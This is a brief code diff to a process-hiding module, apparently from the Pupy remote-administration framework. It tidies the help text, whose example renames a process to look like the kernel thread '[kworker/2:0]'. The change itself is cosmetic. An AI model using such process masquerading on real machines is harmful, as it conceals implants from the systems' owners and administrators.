@@ -13,9 +13,7 @@ class HideProcessModule(PupyModule):
 
     @classmethod
     def init_argparse(cls):
-        example = 'Example:\n'
-        example += '>> hide_process --argv "[kworker/2:0]"\n'
-
+        example = 'Example:\n' + '>> hide_process --argv "[kworker/2:0]"\n'
         cls.arg_parser = PupyArgumentParser(prog="hide_process", description=cls.__doc__, epilog=example)
         cls.arg_parser.add_argument('--argv', default="/bin/bash", help='change the new process argv')
 
